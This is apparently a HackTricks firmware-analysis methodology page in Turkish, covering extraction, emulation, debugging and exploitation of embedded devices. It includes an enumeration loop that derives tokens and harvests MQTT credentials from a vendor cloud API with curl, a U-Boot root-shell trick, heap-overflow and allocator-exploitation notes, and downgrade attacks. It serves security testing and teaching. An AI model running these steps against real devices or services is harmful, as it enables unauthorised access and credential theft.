# Firmware Analizi

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Giriş**

### İlgili kaynaklar

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, donanım bileşenleri ile kullanıcıların etkileşimde bulunduğu yazılım arasındaki iletişimi yönetip kolaylaştırarak cihazların düzgün çalışmasını sağlayan temel yazılımdır. Kalıcı bellekte saklanır; böylece cihaz açıldığı andan itibaren gerekli talimatlara erişebilir ve işletim sistemi başlatılabilir. Güvenlik açıklarını belirlemede firmware’i incelemek ve olası değişiklikleri yapmak kritik bir adımdır.<sup>[[2]](#references)[[3]](#references)</sup>

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamada kritik bir ilk adımdır. Bu süreçte aşağıdakilere ilişkin veriler toplanır:

- CPU mimarisi ve çalıştırdığı işletim sistemi
- Bootloader ayrıntıları
- Donanım yerleşimi ve veri sayfaları
- Kod tabanı ölçümleri ve kaynak konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişi ve mevzuat sertifikaları
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve tespit edilen güvenlik açıkları

Bu amaçla **open-source intelligence (OSINT)** araçları büyük önem taşır. Ayrıca mevcut açık kaynaklı yazılım bileşenlerini manuel ve otomatik inceleme süreçleriyle analiz etmek de faydalıdır. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, olası sorunları bulmak için kullanılabilecek ücretsiz statik analiz olanağı sunar.

## **Firmware’i Edinme**

Firmware’i edinmenin farklı yolları vardır ve her birinin karmaşıklık düzeyi farklıdır:

- Kaynaktan (**geliştiricilerden, üreticilerden**) doğrudan edinme
- Sağlanan talimatları izleyerek **derleme**
- Resmî destek sitelerinden **indirme**
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorgularından yararlanma
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla **cloud storage** alanlarına doğrudan erişme
- Man-in-the-middle teknikleriyle **güncellemeleri** yakalama
- **UART**, **JTAG** veya **PICit** gibi bağlantılar üzerinden cihazdan **çıkarma**
- Cihaz iletişiminde güncelleme isteklerini **dinleme**
- **Sabit kodlanmış güncelleme uç noktalarını** belirleme ve kullanma
- Bootloader’dan veya ağdan **döküm alma**
- Diğer tüm yöntemler başarısız olursa uygun donanım araçlarını kullanarak depolama yongasını **çıkarma ve okuma**

### Yalnızca UART günlükleri: U-Boot ortam değişkenlerini flash’ta düzenleyerek root shell zorlama

UART RX yoksayılıyorsa (yalnızca günlükler alınıyorsa), **U-Boot ortam değişkeni blob’unu** çevrimdışı düzenleyerek yine de bir init shell başlatmaya zorlayabilirsiniz:<sup>[[6]](#references)</sup>

1. SPI flash’ı SOIC-8 klipsi ve programlayıcıyla (3,3 V) dökümleyin:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env bölümünü bulun, `bootargs` değerini `init=/bin/sh` içerecek şekilde düzenleyin ve blob için **U-Boot env CRC32 değerini yeniden hesaplayın**.
3. Yalnızca env bölümünü yeniden flash’layın ve cihazı yeniden başlatın; UART üzerinde bir shell görünmelidir.

Bu yöntem, bootloader shell’i devre dışı bırakılmış ancak env bölümü harici flash erişimiyle yazılabilir olan gömülü cihazlarda kullanışlıdır.

## Firmware'i analiz etme

Artık **firmware'e sahip olduğunuza göre**, nasıl ele almanız gerektiğini anlamak için içindeki bilgileri çıkarmanız gerekir. Bunun için kullanabileceğiniz farklı araçlar:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Bu araçlarla fazla bir şey bulamazsanız `binwalk -E <bin>` ile imajın **entropisini** kontrol edin. Entropi düşükse imajın şifrelenmiş olması pek olası değildir. Entropi yüksekse muhtemelen şifrelenmiştir (veya bir şekilde sıkıştırılmıştır).

Ayrıca, **firmware içine gömülü dosyaları** çıkarmak için bu araçları kullanabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) aracını da kullanabilirsiniz.

### Dosya Sistemini Alma

Önceki `binwalk -ev <bin>` gibi araçlarla **dosya sistemini çıkarmış** olmanız gerekir.\
Binwalk genellikle dosya sistemini, adını dosya sistemi türünden alan bir **klasörün içine** çıkarır. Bu türler genellikle şunlardan biridir: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Dosya Sistemini Manuel Olarak Çıkarma

Bazen binwalk, dosya sisteminin magic byte değerini imzaları arasında **bulundurmaz**. Bu durumlarda, ikili dosyada dosya sisteminin ofsetini bulmak ve sıkıştırılmış dosya sistemini buradan ayıklamak için binwalk kullanın; ardından aşağıdaki adımlara göre türüne uygun şekilde dosya sistemini **manuel olarak çıkarın**.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs dosya sistemini çıkarmak için aşağıdaki **dd komutunu** çalıştırın.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatif olarak aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanılmıştır)

`$ unsquashfs dir.squashfs`

Dosyalar daha sonra "`squashfs-root`" dizininde bulunur.

- CPIO arşiv dosyaları için

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 dosya sistemleri için

`$ jefferson rootfsfile.jffs2`

- NAND flash kullanan ubifs dosya sistemleri için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware Analizi

Firmware elde edildikten sonra, yapısını ve olası güvenlik açıklarını anlamak için bileşenlerine ayrıştırılması önemlidir. Bu süreç, firmware imajını analiz etmek ve değerli verileri çıkarmak için çeşitli araçların kullanılmasını içerir.

### İlk Analiz Araçları

İkili dosyayı ( `<bin>` olarak anılacaktır) ilk aşamada incelemek için bir dizi komut verilmiştir. Bu komutlar; dosya türlerini belirlemeye, dizeleri çıkarmaya, ikili verileri analiz etmeye ve bölüm ile dosya sistemi ayrıntılarını anlamaya yardımcı olur:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Görüntünün şifreleme durumunu değerlendirmek için `binwalk -E <bin>` komutuyla **entropi** kontrol edilir. Düşük entropi şifreleme olmadığını, yüksek entropi ise olası şifreleme veya sıkıştırmayı gösterir.

**Gömülü dosyaları** çıkarmak için **file-data-carving-recovery-tools** dokümantasyonu ve dosyaları incelemeye yönelik **binvis.io** gibi araçlar ve kaynaklar önerilir.

### Dosya Sistemini Çıkarma

`binwalk -ev <bin>` komutuyla genellikle dosya sistemi çıkarılabilir; çoğu zaman dosya sistemi türünün adını taşıyan bir dizine (ör. squashfs, ubifs) çıkarılır. Ancak **binwalk**, magic bytes eksikliği nedeniyle dosya sistemi türünü tanıyamadığında manuel çıkarma gerekir. Bunun için `binwalk` ile dosya sisteminin offset'i bulunur, ardından `dd` komutuyla dosya sistemi ayıklanır:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Daha sonra, dosya sistemi türüne (ör. squashfs, cpio, jffs2, ubifs) bağlı olarak içeriği manuel olarak çıkarmak için farklı komutlar kullanılır.

### Dosya Sistemi Analizi

Dosya sistemi çıkarıldıktan sonra güvenlik açıkları aranır. Güvenli olmayan ağ daemon'larına, sabit kodlanmış kimlik bilgilerine, API uç noktalarına, güncelleme sunucusu işlevlerine, derlenmemiş koda, başlangıç betiklerine ve çevrimdışı analiz için derlenmiş ikililere odaklanılır.

İncelenmesi gereken **önemli konumlar** ve **öğeler** şunlardır:

- Kullanıcı kimlik bilgileri için **etc/shadow** ve **etc/passwd**
- **etc/ssl** içindeki SSL sertifikaları ve anahtarları
- Olası güvenlik açıkları için yapılandırma ve betik dosyaları
- Daha ayrıntılı analiz için gömülü ikililer
- Yaygın IoT cihazı web sunucuları ve ikilileri

Dosya sistemi içindeki hassas bilgileri ve güvenlik açıklarını ortaya çıkarmaya çeşitli araçlar yardımcı olur:

- Hassas bilgi araması için [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker)
- Kapsamlı firmware analizi için [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Statik ve dinamik analiz için [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba)

### Derlenmiş İkili Dosyalarda Güvenlik Kontrolleri

Dosya sisteminde bulunan hem kaynak kodu hem de derlenmiş ikili dosyalar güvenlik açıkları açısından incelenmelidir. Unix ikili dosyaları için **checksec.sh**, Windows ikili dosyaları içinse **PESecurity** gibi araçlar, istismar edilebilecek korumasız ikili dosyaları belirlemeye yardımcı olur.

## Türetilmiş URL token'ları üzerinden cloud yapılandırması ve MQTT kimlik bilgilerini elde etme

Birçok IoT hub'ı, cihaza özel yapılandırmasını şu biçimdeki bir cloud uç noktasından alır:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analizi sırasında `<token>` değerinin, sabit kodlanmış bir gizli anahtar kullanılarak cihaz kimliğinden yerel olarak türetildiğini görebilirsiniz. Örneğin:

- token = MD5( deviceId || STATIC_KEY ) ve büyük harfli hex olarak gösterilir

Bu tasarım, deviceId ve STATIC_KEY değerlerini öğrenen herkesin URL'yi yeniden oluşturmasına ve cloud yapılandırmasını almasına olanak tanır. Bu yapılandırma çoğu zaman düz metin MQTT kimlik bilgilerini ve topic öneklerini açığa çıkarır.

Uygulamalı iş akışı:

1) UART açılış günlüklerinden deviceId değerini çıkarın

- 3.3V UART adaptörünü (TX/RX/GND) bağlayıp günlükleri yakalayın:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Cloud config URL pattern'ini ve broker adresini yazdıran satırları arayın; örneğin:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Firmware'den STATIC_KEY ve token algoritmasını kurtarın

- Binary'leri Ghidra/radare2'ye yükleyin ve config path'i ("/pf/") veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (ör. MD5(deviceId||STATIC_KEY)).
- Token'ı Bash'te türetin ve digest'i büyük harfe dönüştürün:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Topla cloud config ve MQTT kimlik bilgilerini

- URL'yi oluşturup JSON'ı curl ile çek; sırları çıkarmak için jq ile ayrıştır:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) plaintext MQTT'yi ve zayıf topic ACL'lerini kötüye kullanın (varsa)

- Kurtarılan kimlik bilgilerini kullanarak bakım topic'lerine abone olun ve hassas olayları arayın:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Tahmin edilebilir cihaz kimliklerini listeleyin (ölçekli olarak, yetkilendirmeyle)

- Birçok ekosistem, satıcı OUI/ürün/tür baytlarını ardışık bir sonek ile birleştirir.
- Aday kimlikleri yineleyebilir, token'lar türetebilir ve yapılandırmaları programatik olarak getirebilirsiniz:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notlar
- Toplu enumeration denemeden önce mutlaka açık yetki alın.
- Mümkün olduğunda hedef donanımı değiştirmeden sırları elde etmek için emülasyonu veya statik analizi tercih edin.


Firmware'i emüle etme süreci, bir cihazın çalışmasının veya tek bir programın **dinamik analizini** mümkün kılar. Bu yaklaşım, donanım veya mimari bağımlılıkları nedeniyle zorluklarla karşılaşabilir; ancak kök dosya sistemini veya belirli ikili dosyaları Raspberry Pi gibi mimarisi ve bayt sıralaması eşleşen bir cihaza ya da önceden oluşturulmuş bir sanal makineye aktarmak, daha ileri testleri kolaylaştırabilir.

### Tekil İkili Dosyaları Emüle Etme

Tek programları incelerken programın bayt sıralamasını ve CPU mimarisini belirlemek çok önemlidir.

#### MIPS Mimarisi Örneği

Bir MIPS mimarisi ikili dosyasını emüle etmek için şu komut kullanılabilir:

```bash
file ./squashfs-root/bin/busybox
```

Ve gerekli emülasyon araçlarını yüklemek için:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS (big-endian) için `qemu-mips` kullanılır; little-endian binary'ler için `qemu-mipsel` tercih edilir.

#### ARM Architecture Emulation

ARM binary'leri için süreç benzerdir; emülasyonda `qemu-arm` emulator'ü kullanılır.

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) ve benzeri araçlar, full firmware emülasyonunu kolaylaştırır; süreci otomatikleştirir ve dinamik analize yardımcı olur.

### Emülasyon için bölünmüş ve doğrulanmış root dosya sistemlerini yeniden oluşturma

SquashFS superblock'u okunabiliyor ancak inode, dizin veya fragment-table offset'leri imkânsız görünüyorsa, hemen `unsquashfs`'i yamalamayın. Erken açılış binary'sini tersine mühendislikle inceleyin ve oluşturduğu block-device graph'ını yeniden üretin: gömülü sistemler görünürde bir root partition sunarken, başka bir partition'dan ödünç alınan sektörleri ekleyen bir `dm-linear` eşlemesiyle gerçek dosya sistemini oluşturabilir. Yalnızca superblock'u kontrol etmek başarılı olabilir; buna rağmen sonraki tüm metadata blokları yanlış yerde olabilir.<sup>[[9]](#references)</sup>

Firmware'in aritmetiğini aynen koruyun. Özellikle uzunlukların byte, 512-byte sektör veya 4 KiB sayfa cinsinden olup olmadığını belirleyin; shift ve truncation işlemlerini özgün sıralarıyla yeniden uygulayın ve A/B düzenlerindeki bankaya bağlı tail bölgelerini hesaba katın. Örneğin, `(partition_bytes >> 12) << 3` önce 4 KiB sınırına göre truncation yapar, ancak sonra sonucu 512-byte sektör cinsinden ifade eder; bunu `partition_bytes // 512` ile değiştirmek eklenen extent'i birkaç kilobyte kaydırabilir ve sonraki tüm SquashFS tablolarını bozabilir.<sup>[[9]](#references)</sup>

Yararlı bir doğrulama iş akışı:<sup>[[9]](#references)</sup>

1. Her `dm-linear` segmentinin kaynak cihazını, başlangıç sektörünü ve uzunluğunu verifier/init binary'sinden çıkarın.
2. Extent'leri hizalama semantiğini değiştirmeden birleştirin veya eşleyin.
3. Extraction hâlâ başarısız olursa, yalnızca tahmin edilen sınırın çevresindeki küçük bir aralıkta arama yapın ve tek başına makul görünen bir superblock'u kabul etmek yerine art arda gelen birkaç geçerli metadata yapısını şart koşun.
4. Yeniden oluşturulan image üzerinde değiştirilmemiş bir `unsquashfs` çalıştırın; tüm dizinlerin ve fragment'lerin başarıyla taranması, `unsquashfs -stat` çıktısından daha güçlü bir kanıttır.

#### Analyst-controlled dm-verity replacement

Analist QEMU kernel'i, initramfs'i ve sanal diskleri kontrol ediyorsa, vendor'ın doğrulama PID 1'i küçük, statik olarak linklenmiş bir init ile değiştirerek değiştirilmiş bir root başlatılabilir. Bu bir **lab boot-chain substitution** yöntemidir; dm-verity'nin, RSA signature'ının, Secure Boot'un veya TPM ile mühürlenmiş bir anahtarın kırılması değildir.<sup>[[9]](#references)</sup>

Yeni init, özgün boot path'in işlevsel kısımlarını taklit etmelidir: `devtmpfs`'i mount etmek, `setsid()` çağırmak, `/dev/console`'ı 0–2 file descriptor'larına bağlamak, `/proc` ve `/sys`'i mount etmek, sağlanan block device'ın hazır olmasını beklemek, düzenlenmiş root'u salt okunur olarak mount etmek, eski root'a ait pseudo-filesystem'leri ayırmak, yeni mount'u `/` üzerine taşımak, `chroot` yapmak ve firmware'in özgün `/sbin/init` dosyasını `execve()` ile çalıştırmak. `MS_MOVE` öncesinde `/dev`, `/proc` ve `/sys`'i ayırmak, yeni root'a ait mount point'lerin yanlışlıkla ayrılmasını önler.<sup>[[9]](#references)</sup>

Değiştirilebilir cihaz durumunu, değiştirilmiş immutable root'tan ayrı tutun. Bir qcow2 overlay özgün diskin LVM durumunu korurken, ikinci bir salt okunur virtio disk düzenlenmiş SquashFS'i sağlayabilir:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Çevrimdışı imaj durumu hata ayıklaması

Yavaş açılışlar, yıkıcı başlangıç betikleri veya güvenilmez konsol günlükleri hatayı belirsizleştirdiğinde, kalıcı durumu guest dışında inceleyin. Çalışan bir VM'nin kullandığı overlay'i asla bağlamayın; imajı `qemu-nbd` ile erişime açın, LVM keşfini amaçlanan NBD bölümüyle sınırlandırın ve bağlantıyı kesmeden önce volume group'u devre dışı bırakın.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Tekrarlanabilir hata yalıtımı için zaman damgalı işaretçi dosyalarını yazılabilir, kalıcı bir volume'a yazın ve bunları çevrimdışı doğrulayın; `/dev/kmsg`, FIFO'lar ve geçici konsollar, hız sınırlaması veya sürecin erken sonlanması nedeniyle yanlış negatif sonuçlar verebilir. Ayrıca ilgisiz kodu değiştirmeden önce katmanlar arasındaki arayüzleri birebir karşılaştırın: `uname -r` ile `/lib/modules/`, diskteki ext4 özellikleri ile kernel yapılandırması ve Mesa `libGL` nesli ile DRI driver ABI'si ve PCI'dan türetilen driver adları. Bir bileşen mevcut olabilir, hatta `dlopen()` ile başarıyla yüklenebilir; ancak onu kullanan bileşen farklı bir ABI beklediğinden kullanılamaz durumda kalabilir.<sup>[[9]](#references)</sup>

## Pratikte Dinamik Analiz

Bu aşamada analiz için gerçek veya emüle edilmiş bir cihaz ortamı kullanılır. OS ve filesystem'e shell erişimini korumak çok önemlidir. Emülasyon donanım etkileşimlerini kusursuz biçimde taklit etmeyebilir; bu nedenle zaman zaman emülasyonu yeniden başlatmak gerekebilir. Analizde filesystem yeniden incelenmeli, dışa açık web sayfaları ve ağ servisleri exploit edilmeli, bootloader zafiyetleri araştırılmalıdır. Olası backdoor zafiyetlerini belirlemek için firmware bütünlük testleri kritik öneme sahiptir.

## Çalışma Zamanı Analiz Teknikleri

Çalışma zamanı analizi, bir süreç veya binary ile çalışma ortamında etkileşime girmeyi içerir. Breakpoint'ler ayarlamak ve fuzzing ile diğer teknikleri kullanarak zafiyetleri belirlemek için gdb-multiarch, Frida ve Ghidra gibi araçlardan yararlanılır.

Tam bir debugger bulunmayan embedded hedeflerde **statik olarak bağlanmış bir `gdbserver` dosyasını** cihaza kopyalayın ve uzaktan bağlanın:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio yardımcı işlemci mesaj eşleme

IoT hub'larında RF yığını genellikle bir **radyo MCU** ile Linux userland süreci arasında bölünür. Yararlı bir iş akışı, yolu eşlemektir:<sup>[[8]](#references)</sup>

1. Havada **RF frame**
2. Radyo MCU'daki **controller-side parser**
3. Linux'a aktarılan **serial/UART text veya TLV protocol** (örneğin `/dev/tty*`)
4. Ana daemon'daki **application dispatcher**
5. **Protocol-specific handler / state machine**

Bu mimari, tek bir hedef yerine iki tersine mühendislik hedefi oluşturur. Controller, ikili radyo frame'lerini `Group,Command,arg1,arg2,...` gibi metinsel bir protokole dönüştürüyorsa şunları belirleyin:

- **Mesaj grupları** ve dispatch tabloları
- Hangi mesajların **network** üzerinden, hangilerinin doğrudan controller'dan gelebileceği
- Kesin **manufacturer-specific discriminator fields** (örneğin Zigbee `manufacturer_code` ve özel `cluster_command`)
- Yalnızca **commissioning**, discovery veya firmware/model indirme aşamalarında erişilebilen handler'lar

Özellikle Zigbee için eşleştirme trafiğini yakalayın ve hedefin hâlâ varsayılan **Link Key** `ZigBeeAlliance09` değerini kullanıp kullanmadığını kontrol edin. Kullanıyorsa commissioning trafiğini dinlemek **Network Key** değerini açığa çıkarabilir. Zigbee 3.0 install code'ları bu riski azaltır; bu nedenle test edilen cihazın bunları gerçekten zorunlu kılıp kılmadığını not edin.

### Manufacturer-specific protocol handler'ları ve FSM ile kısıtlanan erişilebilirlik

Vendor-specific Zigbee/ZCL komutları, **özel parsing code** ve daha az sınanmış doğrulamaya sahip dahili **FSM**'leri kullandıkları için genellikle standartlaştırılmış cluster'lardan daha iyi hedeflerdir.<sup>[[8]](#references)</sup>

Uygulanabilir iş akışı:

- **Vendor-only handler**'ı bulana kadar command dispatcher'ı tersine mühendislikle inceleyin.
- **FSM state**, **event**, **check**, **action** ve **next-state** tablolarını çıkarın.
- Otomatik ilerleyen **transitional state**'leri ve saldırganın kontrolündeki durumu sonunda sıfırlayan veya serbest bırakan retry/error dallarını belirleyin.
- Hatalı handler'ın her zaman erişilebilir olduğunu varsaymak yerine, daemon'ı savunmasız duruma getirmek için hangi meşru protokol alışverişlerinin gerektiğini doğrulayın.

Zamanlamaya duyarlı protokollerde Python framework'ünden paket replay etmek fazla yavaş olabilir. Daha güvenilir bir yaklaşım, doğru **endpoint**'leri, **attribute**'ları ve commissioning zamanlamasını sağlayabilmek için vendor-grade stack kullanan gerçek donanımda (örneğin **nRF52840**) meşru bir cihazı emüle etmektir.

### Embedded daemon'larda parçalı indirme hatası sınıfı

Tekrarlayan bir firmware hatası sınıfı, **fragmented blob/model/configuration download** işlemlerinde görülür:<sup>[[8]](#references)</sup>

1. **İlk fragment** (`offset == 0`), `ctx->total_size` değerini kaydeder ve `malloc(total_size)` ile bellek ayırır.
2. Sonraki fragment'ler yalnızca `packet_total_size >= offset + chunk_len` gibi saldırganın kontrolündeki **pakete özgü** alanları doğrular.
3. Kopyalama, **ilk ayrılan boyut** ile karşılaştırma yapmadan `memcpy(&ctx->buffer[offset], chunk, chunk_len)` kullanır.

Böylece saldırgan şunları gönderebilir:

- Küçük bir heap allocation yapılmasını sağlamak için **küçük** bir toplam boyut bildiren geçerli bir ilk fragment.
- Beklenen `offset` değerine sahip, ancak daha büyük `chunk_len` içeren sonraki bir fragment.
- Yeni kontrolleri geçerken ilk ayrılmış buffer'ın taşmasına neden olan, sahte paket boyutu.

Savunmasız yol commissioning mantığının arkasındaysa, hatalı fragment'leri göndermeden önce hedefi beklenen model-download veya blob-download durumuna getirecek kadar **device emulation** yapmak gerekir.

### Protocol kaynaklı `free()` tetikleyicileri

Embedded daemon'larda heap metadata exploitation'ı tetiklemenin en kolay yolu genellikle "temizliği beklemek" değil, **protokolün kendi hata işleme mekanizmasını zorlamaktır**:<sup>[[8]](#references)</sup>

- FSM'i **retry** veya **error** durumlarına geçirmek için hatalı devam fragment'leri gönderin.
- Retry eşiğini aşarak daemon'ın **context'i sıfırlamasını** ve bozulmuş buffer'ı serbest bırakmasını sağlayın.
- Süreç ilgisiz nedenlerle çökmeden önce allocator-side primitive'leri tetiklemek için bu öngörülebilir `free()` çağrısını kullanın.

Bu yöntem, özellikle embedded Linux'taki **musl/uClibc/dlmalloc benzeri** allocator'lara karşı kullanışlıdır; burada bozulmuş chunk metadata, unlink/unbin mantığını bir write primitive'e dönüştürebilir. Kararlı bir yöntem, gerçek bin pointer'larını hemen bozup süreci çökertmek yerine **size field**'ı bozarak allocator traversal'ını taşırılmış buffer içinde hazırlanmış **fake chunk**'lara yönlendirmektir.

## Binary Exploitation ve Proof-of-Concept

Belirlenen zafiyetler için PoC geliştirmek, hedef mimarinin derinlemesine anlaşılmasını ve düşük seviyeli dillerde programlama yapmayı gerektirir. Embedded sistemlerde binary runtime korumaları nadirdir; ancak mevcut olduklarında Return Oriented Programming (ROP) gibi teknikler gerekebilir.

### uClibc fastbin exploitation notları (embedded Linux)

- **Fastbin'ler + birleştirme:** uClibc, glibc'ye benzer fastbin'ler kullanır. Daha sonraki büyük bir allocation `__malloc_consolidate()` işlevini tetikleyebilir; bu nedenle fake chunk kontrollerden geçebilmelidir (makul bir size, `fd = 0` ve çevresindeki chunk'ların "in use" görünmesi).<sup>[[6]](#references)</sup>
- **ASLR altında non-PIE binary'ler:** ASLR etkin olsa bile ana binary **non-PIE** ise, binary içindeki `.data/.bss` adresleri sabittir. Fastbin allocation'ı **function pointer table** üzerine düşürmek için geçerli bir heap chunk header'ına benzeyen bir bölgeyi hedefleyebilirsiniz.
- **Parser'ı durduran NUL:** JSON parse edilirken payload içindeki bir `\x00`, parse işlemini durdurabilir ve stack pivot/ROP chain için sondaki saldırgan kontrollü baytları koruyabilir.
- **`/proc/self/mem` üzerinden shellcode:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağıran bir ROP chain, bilinen bir mapping içine çalıştırılabilir shellcode yerleştirip oraya atlayabilir.

## Firmware Analysis için Hazır İşletim Sistemleri

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi işletim sistemleri, firmware güvenlik testleri için gerekli araçlarla donatılmış, önceden yapılandırılmış ortamlar sunar.

## Firmware Analizi için Hazır İşletim Sistemleri

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarının güvenlik değerlendirmesini ve penetration testing işlemlerini gerçekleştirmenize yardımcı olmak için tasarlanmış bir dağıtımdır. Gerekli tüm araçların yüklü olduğu, önceden yapılandırılmış bir ortam sunarak size çok zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Firmware güvenlik testi araçları önceden yüklenmiş, Ubuntu 18.04 tabanlı embedded güvenlik testi işletim sistemi.

## Firmware Downgrade Attacks ve Güvensiz Update Mekanizmaları

Bir vendor, firmware imajları için kriptografik imza kontrolleri uygulasa bile **version rollback (downgrade) koruması** çoğu zaman bulunmaz. Boot veya recovery loader, imzayı yalnızca gömülü bir public key ile doğruluyor ancak yüklenen imajın *version* değerini (veya monotonik bir sayacı) karşılaştırmıyorsa saldırgan, geçerli bir imzaya sahip **daha eski ve savunmasız firmware'i** meşru şekilde yükleyebilir ve böylece yamalanmış zafiyetleri yeniden ortaya çıkarabilir.<sup>[[4]](#references)</sup>

Tipik saldırı iş akışı:

1. **Daha eski, imzalı bir imaj edinin**
   * Vendor'ın herkese açık indirme portalından, CDN'inden veya destek sitesinden alın.
   * İmajı yardımcı mobil/masaüstü uygulamalardan çıkarın (ör. Android APK içindeki `assets/firmware/` dizininden).
   * VirusTotal, Internet arşivleri, forumlar vb. üçüncü taraf depolardan edinin.
2. İmajı, açık bir update kanalı üzerinden cihaza **yükleyin veya cihaza sunun**:
   * Web UI, mobil uygulama API'si, USB, TFTP, MQTT vb.
